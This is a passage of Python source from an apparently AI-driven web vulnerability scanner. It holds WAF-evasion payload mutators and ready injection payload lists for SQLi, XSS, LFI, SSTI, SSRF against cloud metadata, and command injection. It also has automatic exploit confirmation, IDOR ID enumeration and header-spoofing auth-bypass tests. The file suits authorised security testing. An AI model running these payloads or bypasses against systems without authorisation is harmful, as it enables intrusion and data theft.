                        f"template_duplicate={skipped_template}, "
                        f"exact_body_duplicate={skipped_body}[/dim]"
                    )
                if time_limit_hit:
                    break
                if level_findings and HAS_OLLAMA:
                    risk_summary = [f.risk for f in level_findings]
                    ai_decision = ai._call(
                        f"Dir fuzzing found {len(level_findings)} paths at depth {depth}. "
                        f"Risks: {risk_summary}. "
                        f"Elapsed: {time.time() - scan_start:.0f}s / {global_max_time}s. "
                        f"Continue? JSON: {{\"continue\": true/false, \"reason\": \"...\"}}",
                        cache=False
                    )
                    if ai_decision and not ai_decision.get("continue", True):
                        console.print(
                            f"  [dim cyan]  AI stopped dir fuzz: "
                            f"{ai_decision.get('reason', 'enough')}[/dim cyan]"
                        )
                        return findings
            depth += 1
        total_time = time.time() - scan_start
        console.print(f"  [green]✓ Dir fuzz done: {len(findings)} finding(s) in {total_time:.0f}s[/green]")
        return findings

    def _print_summary(self, findings: List[Finding], all_findings: List[Finding]):
        by_risk    = collections.defaultdict(list)
        suppressed = [f for f in all_findings if f.fp_filtered]
        for f in findings: by_risk[f.risk].append(f)

        if HAS_RICH:
            t = Table(title="📊 Confirmed Findings", box=box.ROUNDED)
            t.add_column("Risk",  width=10)
            t.add_column("OWASP", width=6)
            t.add_column("Title", style="dim", max_width=60)
            t.add_column("Conf",  width=6)
            t.add_column("✓",    width=4)
            colors = {"Critical":"bold red","High":"red","Medium":"yellow","Low":"cyan","Info":"dim"}
            for risk in ["Critical","High","Medium","Low","Info"]:
                for f in by_risk.get(risk,[]):
                    c = colors.get(risk,"white")
                    t.add_row(f"[{c}]{risk}[/{c}]",f.owasp_id,f.title[:60],
                              f"{f.confidence}%","✅" if f.confirmed else "")
            console.print(t)
            console.print(f"\n[bold]Total:[/bold] {len(findings)} confirmed, {len(suppressed)} FP removed")
        else:
            for f in findings:
                print(f"  [{f.risk}] {f.owasp_id} — {f.title} ({f.confidence}%)")

    @staticmethod
    def _print_tools_status():
        tools = tool_purposes()
        if HAS_RICH:
            t = Table(title="Kali Tools Status", box=box.ROUNDED)
            t.add_column("Tool",   style="cyan")
            t.add_column("Status", width=10)
            t.add_column("Purpose", style="dim")
            for tool, desc in tools.items():
                found = shutil.which(tool) is not None
                st    = "[green]✓ Found[/green]" if found else "[red]✗ Missing[/red]"
                t.add_row(tool, st, desc)
            console.print(t)
        else:
            for tool, desc in tools.items():
                st = "✓" if shutil.which(tool) else "✗"
                print(f"  {st} {tool:12} {desc}")

        wls = WordlistScanner.summary()
        console.print("\n[bold]Wordlists:[/bold]")
        for cat, cnt in wls.items():
            c = "green" if cnt > 0 else "dim"
            console.print(f"  [{c}]{cat:15} {cnt}[/{c}]")


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
normalize_url_template = _normalize_url_template
import random


def _scancontext_update_tech(self, partial: dict):
    with self.lock:
        for key, value in (partial or {}).items():
            if value and value != "unknown":
                self.site_tech[key] = value


def _scancontext_add_findings(self, findings: List[Finding]):
    if not findings:
        return
    with self.lock:
        self.findings.extend(findings)


if not hasattr(ScanContext, "update_tech"):
    ScanContext.update_tech = _scancontext_update_tech
if not hasattr(ScanContext, "add_findings"):
    ScanContext.add_findings = _scancontext_add_findings


_RESPONSE_LIMITS: dict = {
    "application/json": 2_000_000,
    "text/plain": 1_000_000,
    "text/html": 512_000,
    "application/xml": 512_000,
    "text/xml": 512_000,
    "application/javascript": 4_000_000,
    "default": 512_000,
}
MAX_REDIRECTS = 10


def _response_limit(content_type: str) -> int:
    ct = (content_type or "").split(";", 1)[0].strip().lower()
    for key, limit in _RESPONSE_LIMITS.items():
        if key in ct:
            return limit
    return _RESPONSE_LIMITS["default"]


class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def __init__(self):
        self.redirect_count = 0
        self.redirect_chain: list = []

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        self.redirect_count += 1
        self.redirect_chain.append(newurl)
        if self.redirect_count > MAX_REDIRECTS:
            raise urllib.error.URLError(f"Too many redirects (>{MAX_REDIRECTS}): {newurl}")
        if newurl in self.redirect_chain[:-1]:
            raise urllib.error.URLError(f"Redirect cycle detected: {newurl}")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class HTTPClient:
    def __init__(self, session: SessionContext, timeout: int = DEFAULT_TIMEOUT):
        self.session = session
        self.timeout = timeout
        self._ctx = ssl.create_default_context()
        self._ctx.check_hostname = False
        self._ctx.verify_mode = ssl.CERT_NONE
        self._jar = http.cookiejar.CookieJar()
        self._lock = threading.Lock()
        self._rate_delay: float = 0.0
        self._429_count: int = 0

    def _build_opener(self) -> urllib.request.OpenerDirector:
        return urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=self._ctx),
            urllib.request.HTTPCookieProcessor(self._jar),
            _NoRedirectHandler(),
        )

    def _build_headers(self, extra: Optional[dict] = None) -> dict:
        headers = {
            "User-Agent": DEFAULT_UA,
            "Accept": "text/html,application/xhtml+xml,application/json,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        with self._lock:
            if self.session.cookies:
                headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.session.cookies.items())
            if self.session.jwt_token:
                headers["Authorization"] = f"Bearer {self.session.jwt_token}"
            if self.session.csrf_token:
                headers["X-CSRFToken"] = self.session.csrf_token
            if self.session.headers:
                headers.update(self.session.headers)
        if extra:
            headers.update(extra)
        return headers

    def get(self, url: str, extra_headers: Optional[dict] = None) -> dict:
        return self._request(url, "GET", headers=extra_headers)

    def post(self, url: str, data: Any = None,
             json_data: Optional[dict] = None,
             extra_headers: Optional[dict] = None) -> dict:
        body, content_type = b"", "application/x-www-form-urlencoded"
        if json_data is not None:
            body = json.dumps(json_data).encode()
            content_type = "application/json"
        elif isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
        elif isinstance(data, (str, bytes)):
            body = data.encode() if isinstance(data, str) else data
        headers = {"Content-Type": content_type}
        if extra_headers:
            headers.update(extra_headers)
        return self._request(url, "POST", body=body, headers=headers)

    def _request(self, url: str, method: str,
                 body: Optional[bytes] = None,
                 headers: Optional[dict] = None) -> dict:
        if self._rate_delay > 0:
            time.sleep(self._rate_delay)
        req = urllib.request.Request(
            url, data=body, headers=self._build_headers(headers), method=method
        )
        t0 = time.time()
        try:
            opener = self._build_opener()
            with opener.open(req, timeout=self.timeout) as resp:
                ct = resp.headers.get("Content-Type", "")
                raw = resp.read(_response_limit(ct))
                timing = time.time() - t0
                decoded = raw.decode("utf-8", errors="replace")
                resp_headers = dict(resp.headers)
                with self._lock:
                    for cookie in self._jar:
                        self.session.cookies[cookie.name] = cookie.value
                self._429_count = 0
                if self._rate_delay > 0:
                    self._rate_delay = max(0.0, self._rate_delay * 0.5)
                    if self._rate_delay < 0.5:
                        self._rate_delay = 0.0
                return {
                    "ok": True, "status": resp.status, "url": resp.url,
                    "headers": resp_headers, "body": decoded,
                    "timing": round(timing, 3), "error": None,
                }
        except urllib.error.HTTPError as exc:
            timing = time.time() - t0
            resp_body = ""
            try:
                ct = exc.headers.get("Content-Type", "") if exc.headers else ""
                resp_body = exc.read(_response_limit(ct)).decode("utf-8", errors="replace")
            except Exception:
                pass
            if exc.code == 429:
                self._429_count += 1
                delay = min(2 ** self._429_count, 8.0)
                self._rate_delay = max(self._rate_delay, delay)
                time.sleep(delay)
            return {
                "ok": False, "status": exc.code, "url": url,
                "headers": dict(exc.headers) if exc.headers else {},
                "body": resp_body, "timing": round(timing, 3), "error": str(exc),
            }
        except Exception as exc:
            return {
                "ok": False, "status": 0, "url": url,
                "headers": {}, "body": "", "timing": 0.0, "error": str(exc),
            }


class PayloadMutator:
    def __init__(self, waf_name: str = ""):
        self.waf = (waf_name or "").lower()

    def mutate(self, payload: str, max_variants: int = 20) -> List[str]:
        seen = set()
        variants: List[str] = []

        def add(item: str):
            if item and item not in seen:
                seen.add(item)
                variants.append(item)

        add(payload)
        for fn in (self._url_encode, self._double_url_encode, self._html_entity, self._unicode_escape, self._mixed_case):
            add(fn(payload))
        if "cloudflare" in self.waf:
            tamper_fns = (self._space2comment, self._charencode, self._charunicodeencode)
        elif "modsecurity" in self.waf or "mod_security" in self.waf:
            tamper_fns = (self._between, self._lowercase, self._space2dash)
        elif "aws" in self.waf:
            tamper_fns = (self._randomcase, self._percentage, self._space2plus)
        elif "f5" in self.waf or "big-ip" in self.waf:
            tamper_fns = (self._versionedkeywords, self._space2comment)
        else:
            tamper_fns = (self._space2comment, self._between, self._lowercase, self._randomcase, self._space2plus, self._space2dash, self._percentage, self._charencode)
        for fn in tamper_fns:
            add(fn(payload))
        return variants[:max_variants]

    @staticmethod
    def _url_encode(payload: str) -> str:
        return urllib.parse.quote(payload, safe="")

    @staticmethod
    def _double_url_encode(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    @staticmethod
    def _html_entity(payload: str) -> str:
        return "".join(f"&#{ord(ch)};" if ord(ch) > 127 or ch in "<>\"'&" else ch for ch in payload)

    @staticmethod
    def _unicode_escape(payload: str) -> str:
        return "".join(f"\\u{ord(ch):04x}" if ch in "'\"<>&=;" else ch for ch in payload)

    @staticmethod
    def _mixed_case(payload: str) -> str:
        result = payload
        for kw in ("SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "FROM", "WHERE", "AND", "OR", "NULL", "SLEEP", "WAITFOR"):
            result = re.sub(re.escape(kw), lambda m: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(m.group())), result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def _space2comment(payload: str) -> str:
        return payload.replace(" ", "/**/")

    @staticmethod
    def _space2plus(payload: str) -> str:
        return payload.replace(" ", "+")

    @staticmethod
    def _space2dash(payload: str) -> str:
        return payload.replace(" ", "--\n")

    @staticmethod
    def _between(payload: str) -> str:
        return re.sub(r"(\w+)\s*=\s*(\d+)", lambda m: f"{m.group(1)} BETWEEN {m.group(2)} AND {int(m.group(2)) + 1}", payload)

    @staticmethod
    def _lowercase(payload: str) -> str:
        return payload.lower()

    @staticmethod
    def _randomcase(payload: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    @staticmethod
    def _percentage(payload: str) -> str:
        result = payload
        for kw in ("SELECT", "UNION", "WHERE", "FROM", "AND", "OR"):
            result = re.sub(re.escape(kw), "%".join(kw), result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def _charencode(payload: str) -> str:
        return payload.replace("'", "CHAR(39)")

    @staticmethod
    def _charunicodeencode(payload: str) -> str:
        return "".join(f"NCHAR({ord(ch)})" if ch in "'\"" else ch for ch in payload)

    @staticmethod
    def _versionedkeywords(payload: str) -> str:
        result = payload
        for kw in ("SELECT", "UNION", "FROM", "WHERE"):
            result = re.sub(re.escape(kw), f"/*!{kw}*/", result, flags=re.IGNORECASE)
        return result


BASE_PAYLOADS: dict = {
    "sqli": ["'", "''", "1'--", "1 OR 1=1--", "' OR '1'='1", "1; SELECT SLEEP(3)--", "1' AND SLEEP(3)--", "' UNION SELECT NULL,NULL,NULL--", "1 AND 1=2", "'; WAITFOR DELAY '0:0:3'--", "admin'--", "1' AND 1=1--", "' OR 1=1#"],
    "xss": ["<script>alert(1)</script>", '"><script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "<svg onload=alert(1)>", "javascript:alert(1)", "'><script>alert(1)</script>"],
    "lfi": ["../../../../etc/passwd", "../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../../../windows/win.ini", "/etc/passwd", "file:///etc/passwd"],
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}", "{{self.__dict__}}", "{% debug %}", "{{request.environ}}"],
    "ssrf": ["http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/", "http://0x7f000001/", "http://2130706433/", "http://127.1/", "http://[::1]/", "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:9200/_cat/indices", "file:///etc/passwd"],
    "cmdi": ["; id", "| id", "$(id)", "; sleep 5", "| sleep 5", "$(sleep 5)", "; cat /etc/passwd", "| cat /etc/passwd", "|| id", "; whoami", "\nid\n", "`id`"],
}


def get_payloads(vuln_type: str, waf_name: str = "", max_variants: int = 20, base_only: bool = False) -> List[str]:
    base = list(BASE_PAYLOADS.get(vuln_type, ["'", '"', "<script>alert(1)</script>", "{{7*7}}", "../../../../etc/passwd", "; id", "1 OR 1=1"]))
    if base_only or not base:
        return base
    mutator = PayloadMutator(waf_name=waf_name)
    merged: List[str] = []
    seen = set()
    for payload in base:
        for variant in mutator.mutate(payload, max_variants=5):
            if variant not in seen:
                seen.add(variant)
                merged.append(variant)
        if len(merged) >= max_variants:
            break
    return merged[:max_variants]


EVIDENCE_SCORES: Dict[str, int] = {
    "sql_error_with_table": 90,
    "rce_output": 90,
    "file_content": 88,
    "aws_metadata": 92,
    "sql_version": 88,
    "xss_reflected": 85,
    "ssti_computed": 88,
    "ssrf_internal_resp": 85,
    "time_blind": 60,
    "size_diff_large": 40,
    "status_change": 35,
    "new_error_generic": 30,
}


def score_evidence(evidence_tags: List[str]) -> int:
    if not evidence_tags:
        return 0
    scores = sorted([EVIDENCE_SCORES.get(tag, 20) for tag in evidence_tags], reverse=True)
    return min(100, int(scores[0] + sum(s * 0.1 for s in scores[1:])))


SQL_ERROR_PATTERNS: List[Tuple[str, str]] = [
    (r"sql syntax.*near", "sql_error_with_table"),
    (r"ORA-\d{4,5}", "sql_error_with_table"),
    (r"pg::\w+error", "sql_error_with_table"),
    (r"mysql_fetch\w+\(\)", "sql_error_with_table"),
    (r"microsoft.*sql.*server.*error", "sql_error_with_table"),
    (r"jdbc\.\w+exception", "sql_error_with_table"),
    (r"unclosed quotation mark", "sql_error_with_table"),
    (r"unterminated string literal", "sql_error_with_table"),
    (r"invalid column name", "sql_error_with_table"),
    (r"table or view not found", "sql_error_with_table"),
    (r"database error", "new_error_generic"),
    (r"query failed", "new_error_generic"),
]
LFI_PATTERNS: List[Tuple[str, str]] = [
    (r"root:x:0:0:", "file_content"),
    (r"\[extensions\]", "file_content"),
    (r"daemon:x:\d+:\d+:", "file_content"),
    (r"win\.ini.*\[fonts\]", "file_content"),
]
RCE_PATTERNS: List[Tuple[str, str]] = [
    (r"uid=\d+\(\w+\)\s+gid=\d+", "rce_output"),
    (r"root\s+\d+\s+\d+\.\d+", "rce_output"),
    (r"total \d+\ndrwx", "rce_output"),
]
SSRF_PATTERNS: List[Tuple[str, str]] = [
    (r"ami-id.*instance-id", "aws_metadata"),
    (r"iam/security-credentials", "aws_metadata"),
    (r"computeMetadata/v1", "aws_metadata"),
    (r"\+PONG", "ssrf_internal_resp"),
    (r"redis_version", "ssrf_internal_resp"),
]
XSS_MARKERS = ["<script>alert(", "<img src=x onerror=", "<svg onload="]


class SemanticResponseDiff:
    def diff(self, baseline: BaselineFingerprint, fuzz_resp: dict,
             payload: str, vuln_type: str = "", timing: float = 0.0) -> dict:
        body = fuzz_resp.get("body", "")
        status = fuzz_resp.get("status", 0)
        body_lower = body.lower()
        evidence_tags: List[str] = []
        evidence_text: List[str] = []
        if status != baseline.status:
            evidence_tags.append("status_change")
            evidence_text.append(f"Status: {baseline.status} -> {status}")
        timing_diff = timing - baseline.timing_avg
        if timing > 3.0 and timing_diff > 2.5 and baseline.timing_avg < 1.5:
            evidence_tags.append("time_blind")
            evidence_text.append(f"Time delay: baseline={baseline.timing_avg:.2f}s fuzz={timing:.2f}s diff={timing_diff:.2f}s")
        for pattern, tag in SQL_ERROR_PATTERNS:
            match = re.search(pattern, body_lower)
            if match:
                evidence_tags.append(tag)
                evidence_text.append(f"SQL indicator: {match.group()[:80]}")
                break
        for pattern, tag in LFI_PATTERNS:
            match = re.search(pattern, body_lower)
            if match:
                evidence_tags.append(tag)
                evidence_text.append(f"File content: {match.group()[:80]}")
                break
        for pattern, tag in RCE_PATTERNS:
            match = re.search(pattern, body)
            if match:
                evidence_tags.append(tag)
                evidence_text.append(f"RCE output: {match.group()[:80]}")
                break
        for pattern, tag in SSRF_PATTERNS:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                evidence_tags.append(tag)
                evidence_text.append(f"SSRF indicator: {match.group()[:80]}")
                break
        if payload and any(marker in body for marker in XSS_MARKERS) and payload[:20] in body:
            evidence_tags.append("xss_reflected")
            evidence_text.append(f"XSS payload reflected: {payload[:40]}")
        if vuln_type == "ssti" and "49" in body and "7*7" in (payload or ""):
            evidence_tags.append("ssti_computed")
            evidence_text.append("SSTI: 7*7=49 computed in response")
        size_diff = len(body) - baseline.body_len
        size_pct = abs(size_diff) / max(baseline.body_len, 1) * 100
        if size_pct > 40 and abs(size_diff) > 300:
            evidence_tags.append("size_diff_large")
            evidence_text.append(f"Size diff: {size_diff:+d} bytes ({size_pct:.1f}%)")
        confidence = score_evidence(evidence_tags)
        return {
            "evidence_tags": evidence_tags,
            "evidence_text": evidence_text,
            "confidence": confidence,
            "status_changed": status != baseline.status,
            "time_anomaly": "time_blind" in evidence_tags,
            "size_diff": size_diff,
            "size_pct": round(size_pct, 1),
            "is_interesting": confidence >= 30 or bool(evidence_tags),
            "body_snippet": body[:600],
        }


class ResponseClassifier:
    _STATIC_EXTENSIONS = {
        ".js", ".mjs", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif",
        ".webp", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".otf", ".avif",
    }
    _STATIC_PATH_MARKERS = (
        "/_next/static/", "/_next/image", "/static/", "/assets/", "/favicon",
        "/images/", "/image/", "/img/", "/fonts/", "/css/", "/js/", "/dist/", "/build/",
    )

    @classmethod
    def normalize_content_type(cls, headers: Optional[dict]) -> str:
        headers = headers or {}
        ct = headers.get("content-type", headers.get("Content-Type", "")) or ""
        return str(ct).split(";", 1)[0].strip().lower()

    @classmethod
    def is_static_asset_url(cls, url: str) -> bool:
        path = urllib.parse.urlparse(str(url or "")).path.lower()
        if not path:
            return False
        if any(marker in path for marker in cls._STATIC_PATH_MARKERS):
            return True
        return any(path.endswith(ext) for ext in cls._STATIC_EXTENSIONS)

    @classmethod
    def classify(cls, url: str, headers: Optional[dict] = None, body: str = "", status: int = 0) -> dict:
        ct = cls.normalize_content_type(headers)
        body_lower = str(body or "")[:4000].lower()
        verdict = "unknown"
        reason = "No strong classification signal."
        if cls.is_static_asset_url(url) or ct.startswith(("image/", "font/", "audio/", "video/")):
            verdict = "static_asset"
            reason = "Static URL pattern or content type."
        elif status in (401, 403):
            verdict = "protected_content"
            reason = "Explicit authorization status."
        elif "text/html" in ct or "<html" in body_lower or "<body" in body_lower:
            login_score = sum(1 for marker in ['type="password"', "sign in", "login", "log in", "forgot password"] if marker in body_lower)
            if login_score >= 2:
                verdict = "login_page"
                reason = "HTML contains login form markers."
            else:
                public_score = sum(1 for marker in ["<nav", "<footer", "copyright", "contact", "__next", "_next/static"] if marker in body_lower)
                verdict = "public_page" if public_score >= 1 else "unknown"
                reason = "HTML looks public." if verdict == "public_page" else reason
        elif "json" in ct or str(body).lstrip().startswith(("{", "[")):
            verdict = "data_response"
            reason = "Structured JSON/API response."
        title_match = re.search(r"<title[^>]*>(.*?)</title>", str(body or ""), re.I | re.S)
        title = title_match.group(1).strip()[:120] if title_match else ""
        return {
            "verdict": verdict,
            "reason": reason,
            "content_type": ct or "unknown",
            "status": int(status or 0),
            "title": title,
            "url": url,
        }


class AgenticFuzzEngine:
    _MANDATORY_INJECTION_PARAMS = {
        "q", "query", "search", "keyword", "keywords", "term", "terms",
        "filter", "find", "lookup", "s", "k", "w", "text",
        "id", "user_id", "uid", "account_id", "product_id", "item_id",
        "post_id", "comment_id", "order_id", "name", "username", "email",
        "input", "data", "value", "content", "message", "comment", "title",
        "slug", "body", "file", "path", "page", "include", "load", "template",
        "doc", "url", "redirect", "next", "src", "href", "dest", "target",
        "cmd", "exec", "command", "ping", "host", "ip",
    }

    def __init__(self, client: HTTPClient, baseline: Any = None,
                 kali: Any = None, ai: Any = None, ctx: Optional[ScanContext] = None,
                 oob: Any = None, waf_name: str = ""):
        self.client = client
        self.baseline = baseline
        self.kali = kali
        self.ai = ai
        self.ctx = ctx or ScanContext()
        self.oob = oob
        self.waf_name = waf_name or getattr(kali, "_waf_detected", "") or ""
        self._differ = SemanticResponseDiff()
        self._last_resp: dict = {}

    def test_endpoint(self, ep: Endpoint) -> List[Finding]:
        local_findings: List[Finding] = []
        base_fp = self._get_baseline(ep)
        if base_fp.status in (401, 403):
            local_findings.extend(self._test_auth_bypass(ep, base_fp))
        local_findings.extend(self._mandatory_injections(ep, base_fp))
        local_findings.extend(self._test_idor_all(ep, base_fp))
        local_findings.extend(self._test_security_headers(ep, base_fp))
        return local_findings

    def _get_baseline(self, ep: Endpoint) -> BaselineFingerprint:
        if self.baseline and hasattr(self.baseline, "get"):
            try:
                return self.baseline.get(ep)
            except Exception:
                pass
        resp = self.client.get(ep.url) if ep.method == "GET" else self.client.post(ep.url, data=ep.params)
        if resp["status"] == 0:
            return BaselineFingerprint(0, 0, "", "", 0, "", 0, [])
        body = resp["body"]
        return BaselineFingerprint(
            status=resp["status"],
            body_len=len(body),
            body_hash=hashlib.md5(body.encode()).hexdigest(),
            title=self._extract_title(body),
            timing_avg=resp["timing"],
            headers_sig="",
            word_count=len(body.split()),
            error_strings=self._extract_errors(body),
        )

    def _mandatory_injections(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        findings: List[Finding] = []
        for param_key, _param_val in list(ep.params.items()):
            pname = param_key.split(":")[-1].lower()
            if param_key.startswith(("header:", "cookie:")) or pname not in self._MANDATORY_INJECTION_PARAMS:
                continue
            vuln_types = ["sqli", "xss", "ssti"]
            if pname in {"file", "path", "page", "include", "load", "template", "doc"}:
                vuln_types.append("lfi")
            if pname in {"url", "redirect", "next", "src", "href", "dest", "target"}:
                vuln_types.append("ssrf")
            if pname in {"cmd", "exec", "command", "ping", "host", "ip"}:
                vuln_types.append("cmdi")
            for vuln_type in vuln_types:
                findings.extend(self._test_injection(vuln_type, param_key, ep, base_fp))
        return findings

    def _test_injection(self, vuln_type: str, param: str, ep: Endpoint,
                        base_fp: BaselineFingerprint) -> List[Finding]:
        payloads = self._get_payloads(vuln_type, ep)
        best_diff: dict = {}
        best_resp: dict = {}
        best_payload = ""
        for payload in payloads[:12]:
            if self.ctx.already_tested(ep.url, ep.method, param, payload):
                continue
            resp = self._fuzz_request(ep, param, payload)
            diff = self._differ.diff(base_fp, resp, payload, vuln_type, resp.get("timing", 0))
            self._last_resp = resp
            if diff["is_interesting"] and diff["confidence"] > best_diff.get("confidence", 0):
                best_diff = diff
                best_resp = resp
                best_payload = payload
                if diff["confidence"] >= 85:
                    break
        if not best_diff or not best_diff.get("is_interesting"):
            return []
        confirmed, confirm_evidence = self._auto_confirm(vuln_type, param, best_payload, ep)
        if confirm_evidence:
            best_diff["evidence_tags"].extend(confirm_evidence)
            best_diff["confidence"] = score_evidence(best_diff["evidence_tags"])
        confidence = best_diff["confidence"]
        if confidence < MIN_CONFIDENCE:
            return []
        finding = Finding(
            owasp_id=self._owasp_id(vuln_type),
            owasp_name=self._owasp_name(vuln_type),
            title=f"{vuln_type.upper()} in {param.split(':')[-1]}: {ep.url}",
            risk=self._risk(vuln_type, confidence),
            confidence=confidence,
            url=ep.url,
            method=ep.method,
            param=param,
            payload=best_payload,
            evidence="; ".join(best_diff.get("evidence_text", []))[:400],
            baseline_diff=json.dumps(best_diff, default=str)[:300],
            tool_output=best_resp.get("body", "")[:500],
            request_raw=self._build_req(ep, param, best_payload),
            response_raw=best_resp.get("body", "")[:600],
            exploit_cmd=self._build_exploit(vuln_type, ep, param, best_payload),
            remediation=self._remediation(vuln_type),
            confirmed=confirmed,
            tool=vuln_type,
        )
        self._print_finding(finding)
        return [finding]

    def _auto_confirm(self, vuln_type: str, param: str, payload: str, ep: Endpoint) -> tuple:
        extra: list = []
        if vuln_type == "sqli":
            for test in ("' UNION SELECT version(),NULL--", "' UNION SELECT @@version,NULL--", "1 UNION SELECT version()--"):
                if self.ctx.already_tested(ep.url, ep.method, param, test):
                    continue
                body = self._fuzz_request(ep, param, test).get("body", "")
                if re.search(r"\d+\.\d+\.\d+-", body) or "postgresql" in body.lower():
                    extra.append("sql_version")
                    return True, extra
        elif vuln_type == "xss":
            marker = f"XSSCHECK{hashlib.md5(payload.encode()).hexdigest()[:6]}"
            body = self._fuzz_request(ep, param, f'\"><img src=x onerror=alert("{marker}")>').get("body", "")
            if marker in body:
                extra.append("xss_reflected")
                return True, extra
        elif vuln_type == "lfi":
            for test in ("../../../../etc/passwd", "../../../../windows/win.ini"):
                body = self._fuzz_request(ep, param, test).get("body", "")
                if "root:x:0:0:" in body or "[extensions]" in body:
                    extra.append("file_content")
                    return True, extra
        elif vuln_type == "cmdi":
            marker = f"CMDCHECK{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}"
            for test in (f"; echo {marker}", f"| echo {marker}", f"$(echo {marker})"):
                if marker in self._fuzz_request(ep, param, test).get("body", ""):
                    extra.append("rce_output")
                    return True, extra
        elif vuln_type == "ssrf":
            body = self._fuzz_request(ep, param, "http://169.254.169.254/latest/meta-data/").get("body", "").lower()
            if "ami-id" in body or "instance-id" in body:
                extra.append("aws_metadata")
                return True, extra
        return False, extra

    def _test_idor_all(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        findings: List[Finding] = []
        path = urllib.parse.urlparse(ep.url).path
        id_params: List[tuple] = []
        for key, value in ep.params.items():
            pname = key.split(":")[-1].lower()
            if pname in {"id", "uid", "user_id", "account_id", "item_id", "post_id", "order_id", "comment_id", "product_id", "ticket_id"}:
                id_params.append((key, str(value), "param"))
        for match in re.finditer(r"/(\d{1,12})(?=/|$|\?)", path):
            id_params.append((f"path_id:{match.group(1)}", match.group(1), "path"))
        for param_key, original, id_type in id_params:
            for test_value in self._generate_idor_ids(original, id_type):
                if test_value == original or self.ctx.already_tested(ep.url, "GET", param_key, test_value):
                    continue
                resp = self.client.get(ep.url.replace(f"/{original}", f"/{test_value}", 1)) if id_type == "path" else self._fuzz_request(ep, param_key, test_value)
                diff = self._differ.diff(base_fp, resp, test_value, "idor", resp.get("timing", 0))
                self._last_resp = resp
                if diff.get("confidence", 0) >= MIN_CONFIDENCE:
                    findings.append(Finding(
                        owasp_id="A01",
                        owasp_name="Broken Access Control",
                        title=f"IDOR: {param_key} {original}->{test_value}: {ep.url}",
                        risk="High",
                        confidence=diff["confidence"],
                        url=ep.url,
                        method="GET",
                        param=param_key,
                        payload=test_value,
                        evidence="; ".join(diff.get("evidence_text", []))[:300],
                        baseline_diff=f"{original}->{test_value}",
                        tool_output=resp.get("body", "")[:400],
                        request_raw=f"GET {ep.url} ({param_key}={test_value})",
                        response_raw=resp.get("body", "")[:400],
                        exploit_cmd=f"curl '{ep.url}?{param_key.split(':')[-1]}={test_value}'",
                        remediation="Verify object ownership before returning data.",
                        tool="idor",
                    ))
                    break
        return findings

    @staticmethod
    def _generate_idor_ids(original: str, id_type: str) -> List[str]:
        if id_type in ("path", "param") and re.fullmatch(r"\d+", original):
            number = int(original)
            return [str(number + 1), str(number - 1), str(number + 2), "0", "1", "2", "999999", str(number + 100)]
        return ["1", "2", "0", "admin", "null", "-1"]

    def _test_auth_bypass(self, ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        findings: List[Finding] = []
        path = urllib.parse.urlparse(ep.url).path
        baseline_body = self.client.get(ep.url).get("body", "")
        baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()

        def is_real_bypass(resp: dict) -> tuple:
            if resp.get("status") not in (200, 201, 202, 206):
                return False, 0, ""
            body = resp.get("body", "")
            if len(body) < 50 or hashlib.md5(body.encode()).hexdigest() == baseline_hash:
                return False, 0, ""
            body_lower = body.lower()
            login_sigs = sum(1 for s in ("password", "login", "sign in", "username") if s in body_lower)
            if login_sigs >= 2:
                return False, 0, ""
            return True, 82, f"Status {base_fp.status}->{resp['status']}, body {len(baseline_body)}->{len(body)}"

        for header, value in {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Forwarded-Host": "localhost",
            "Client-IP": "127.0.0.1",
        }.items():
            ok, conf, evidence = is_real_bypass(self.client.get(ep.url, extra_headers={header: value}))
            if ok:
                findings.append(self._bypass_finding(
                    title=f"IP Header Bypass via {header}: {path}",
                    url=ep.url, param=f"header:{header}", payload=value,
                    evidence=evidence, confirmed=True,
                    exploit=f"curl -H '{header}: {value}' '{ep.url}'", conf=conf,
                ))
        return findings

    @staticmethod
    def _bypass_finding(title, url, param, payload, evidence, confirmed, exploit, conf) -> Finding:
        return Finding(
            owasp_id="A01", owasp_name="Broken Access Control",
            title=title, risk="High", confidence=conf, url=url, method="GET",
            param=param, payload=payload, evidence=evidence, baseline_diff="403->200",
            tool_output="", request_raw=f"GET {url}", response_raw="", exploit_cmd=exploit,
            remediation="Enforce authorization at every path level.",
            confirmed=confirmed, tool="auth_bypass",
        )

    def _test_security_headers(self, ep: Endpoint, base_fp: Optional[BaselineFingerprint] = None) -> List[Finding]:
        resp = self.client.get(ep.url)
        headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
        missing = []
        for header, desc in {
            "strict-transport-security": "HSTS missing",
            "content-security-policy": "No CSP",
            "x-frame-options": "Clickjacking possible",
            "x-content-type-options": "MIME sniffing",
        }.items():
            if header not in headers:
                missing.append(f"{header}: {desc}")
        if headers.get("access-control-allow-origin", "") == "*":
            missing.append("CORS wildcard")
        if not missing:
            return []
        return [Finding(
